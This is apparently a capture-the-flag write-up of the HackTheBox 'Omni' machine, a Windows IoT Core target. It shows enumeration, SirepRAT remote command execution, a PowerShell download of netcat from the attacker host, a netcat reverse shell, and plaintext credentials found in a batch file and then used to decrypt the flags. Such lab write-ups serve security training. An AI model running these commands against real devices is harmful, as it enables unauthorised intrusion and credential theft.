# HackTheBox - Omni Writeup
# Ferdinand Mudjialim, Nov 2020

## Scope
The scope of this write-up is simply one machine running on the HackTheBox servers with the IP address of 10.10.10.204.
Connecting to this machine requires a VPN configuration, which is already provided by HackTheBox.

## Enumeration
The first step, like in many other systems, is to perform a port scan with OS fingerprinting using nmap. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV 10.10.10.204      
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-23 15:25 EST
Nmap scan report for 10.10.10.204
Host is up (0.057s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8080/tcp open  upnp    Microsoft IIS httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ sudo nmap -O 10.10.10.204 
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-23 15:26 EST
Nmap scan report for 10.10.10.204
Host is up (0.056s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
8080/tcp open  http-proxy
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
```

When visiting 10.10.10.204:8080, a prompt shows up asking for credentials. It also says 'Windows Device Portal'. Maybe this web server prone to authentication attacks? 

A little bit of research connects this type of setup to some sort of Windows IoT Core technology. 
https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf

## Exploitation 
Interestingly, there is a RAT already implemented for Windows 10 IoT Core devices on GitHub. 
https://github.com/SafeBreach-Labs/SirepRAT
This could be the key. (However, it is in Python 2, kind of annoying but doable with virtual environments)
Also interesting is that the default credential "administrator" and "p@ssw0rd" does not work when logging into the web interface. 

Also, RPC might be vulnerable to CVE-2018-8407, but for the time being, the RAT seems much more lucrative. 

Running Nikto gives interesting information, but it's not very useful. 
```
┌──(kali㉿kali)-[~]
└─$ nikto -h 10.10.10.204:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.204
+ Target Hostname:    10.10.10.204
+ Target Port:        8080
+ Start Time:         2020-11-24 10:57:50 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-HTTPAPI/2.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie CSRF-Token created without the httponly flag
+ / - Requires Authentication for realm 'Windows Device Portal'
+ Default account found for 'Windows Device Portal' at / (ID '', PW '_Cisco'). Cisco device.
+ Root page / redirects to: /authorizationrequired.htm
+ No CGI Directories found (use '-C all' to force check all possible dirs)
```

Using the SirepRAT.py script available on GitHub to get info about the device.
With this script, full RAT capabilities are achieved instantly, but some Python setup is needed first. 
```
┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ virtualenv -p python2 myvenv 
created virtual environment CPython2.7.18.final.0-64 in 2515ms
  creator CPython2Posix(dest=/home/kali/Downloads/SirepRAT/myvenv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==20.2.4, setuptools==44.1.1, wheel==0.35.1
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator

┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ source myvenv/bin/activate

(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ pip install -r requirements.txt
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                                    
Collecting enum34>=1.1.10
  Using cached enum34-1.1.10-py2-none-any.whl (11 kB)
Collecting hexdump>=3.3
  Using cached hexdump-3.3.zip (12 kB)
Building wheels for collected packages: hexdump
  Building wheel for hexdump (setup.py) ... done
  Created wheel for hexdump: filename=hexdump-3.3-py2-none-any.whl size=8915 sha256=1c5dbfb32caa81a35966e21ef730c313e53dca4cba2bdee632c08972c53a7f54
  Stored in directory: /home/kali/.cache/pip/wheels/e2/73/09/9c2970e7906d3fbcfb9a1da05d3a46cc394f3b43ff0724b147
Successfully built hexdump
Installing collected packages: enum34, hexdump
Successfully installed enum34-1.1.10 hexdump-3.3

(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
<SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
```
Looking on the Internet, it seems like the System Information corresponds to some instance of Windows Server 2019:
- dwMajorVersion = 10
- dwMinorVersion = 0
- dwBuildNumber = 17763
- dwPlatformId = 2

Using SirepRAT, we can also enumerate the users on the system. 
```
(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c net user" --v                        
---------

User accounts for \\

-------------------------------------------------------------------------------
Administrator            app                      DefaultAccount           
DevToolsUser             Guest                    sshd                     
WDAGUtilityAccount       
The command completed with one or more errors.


---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 338, payload peek: 'User accounts for \\------------------------'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```

Now is the time for a reverse shell, but first, some preliminary info about the Kali and the Omni machines are needed. 

```
(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c wmic OS get OSArchitecture" --v
OSArchitecture                = 64-bit
```

```
┌──(kali㉿kali)-[~]
└─$ ip a                                                                                                                                                                                                                             255 ⨯
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:08:1c brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 78677sec preferred_lft 78677sec
    inet6 fe80::a00:27ff:feab:81c/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.247/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::10f5/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::e5ce:35cd:5d87:707a/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

```
Now we know that: 
The Omni machine is running on a 64-bit architecture. 
The IP of the Kali machine (on the VPN) is 10.10.14.247. 
The IP of the Omni machine is (still) 10.10.10.204

## Post-Exploitation
Let's try to open a reverse shell with netcat. 
First, we need to download a 64-bit version of netcat and "upload" it to the remote machine.
To do this, set up a temporary HTTP server on Kali to serve the binary and download the file from the remote machine and run it using SirepRAT.   

```
┌──(kali㉿kali)-[~/Downloads/netcat_64]
└─$ ls
doexec.c  generic.h  getopt.c  getopt.h  hobbit.txt  license.txt  Makefile  nc64.exe  nc.exe  netcat.c  readme.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads/netcat_64]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.247:8000/nc64.exe -Outfile C:\Windows\system32\nc64.exe"

<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

Listen on Kali for a netcat connection and establish a reverse shell (Powershell). 
```
┌──(kali㉿kali)-[~/Downloads/netcat_64]
└─$ nc -nlvp 6969
listening on [any] 6969 ...

(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\\Windows\\system32\\nc64.exe 10.10.14.247 6969 -e powershell.exe"                                       
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

Finally! A reverse shell!
```
┌──(kali㉿kali)-[~/Downloads/netcat_64]
└─$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.247] from (UNKNOWN) [10.10.10.204] 49728
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32> 
```

## Privilege Escalation
Now it's time for MORE enumeration... 
Just by cd'ing around, there are interesting files in the Users folder of C:\Data\Users (for admin and app)
We just need to find the creds for the corresponding accounts to decrypt the flags. 
The very first step is to check if there are any plaintext credentials lying hidden somewhere. 
Note that the following was also tried with .xml, .txt, .ini, .ps1, .cmd, .btm, and so on. (typical sysadmin files)

```
PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> Get-ChildItem C:\*.bat -Recurse -Force | Select-String -Pattern administrator
Get-ChildItem C:\*.bat -Recurse -Force | Select-String -Pattern administrator

r.bat:5:for /F "skip=6" %%i in ('net localgroup "administrators"') do net 
localgroup "administrators" %%i /delete
r.bat:8:net user administrator _1nt3rn37ofTh1nGz
``` 

Looking at r.bat, it turns out there are credentials in plaintext!
```
PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> cat r.bat
cat r.bat
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
```

Using these credentials, we are now able to login to the web interface and access the Run Command feature with elevated privileges. This will allow opening a reverse shell with the associated privileges depending on the account used. 

Using a similar approach as above, set up a netcat listen on the Kali machine and run (in the Run Command web UI): 

```
C:\\Windows\\system32\\nc64.exe 10.10.14.247 6969 -e powershell.exe
```

This should open a reverse shell, and checking the user reveals that we have successfuly taken control of the respective user: 

```
PS C:\windows\system32> $env:username
$env:username
Administrator
```

or, if using the "app" user: 

```
PS C:\windows\system32> $env:username
$env:username
app
```

Now, all that is left to do is to decrypt the PSCredentials found earlier in C:\Data\Users\app\user.txt and C:\Data\Users\administrator\root.txt (using the reverse shells for each user "app" and "administrator", respectively)

```
PS C:\windows\system32> $env:username
$env:username
app

PS C:\Data\Users> $credential = Import-CliXml -Path  C:\Data\Users\app\user.txt
$credential = Import-CliXml -Path  C:\Data\Users\app\user.txt

PS C:\Data\Users> $credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().Password
7cfd50f6bc34db3204898f1505ad9d70
```

```
PS C:\windows\system32> $env:username 
$env:username
Administrator

PS C:\windows\system32> $credential = Import-CliXml -Path  C:\Data\Users\administrator\root.txt
$credential = Import-CliXml -Path  C:\Data\Users\administrator\root.txt

PS C:\windows\system32> $credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().Password
5dbdce5569e2c4708617c0ce6e9bf11d
```

These are the flags for each user, and with that, the machine is officially pwned. 